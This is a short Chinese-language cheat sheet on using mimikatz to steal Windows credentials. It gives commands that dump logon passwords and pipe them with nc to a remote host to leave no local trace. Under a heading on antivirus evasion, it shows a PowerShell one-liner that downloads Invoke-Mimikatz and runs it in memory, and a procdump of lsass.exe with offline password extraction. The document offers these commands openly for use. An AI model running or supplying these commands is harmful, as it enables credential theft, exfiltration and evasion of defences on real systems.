# mimikatz用法



### 非交互式抓取密码

```bash
# 1.导出至shash.txt
mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""  exit >> shash.txt

# 2.直接导出到vps，本地无痕迹
mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" exit |  nc 192.168.2.134 4444
```

### 免杀方式

```bash
# 1.使用powershell，下载脚本，内存中执行
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz

# 2.Procdump + Mimikatz
# procdump 下载地址:https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump
# 先进程导出
procdump.exe -accepteula -ma lsass.exe lsass.dmp 
# 再本地还原
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
```

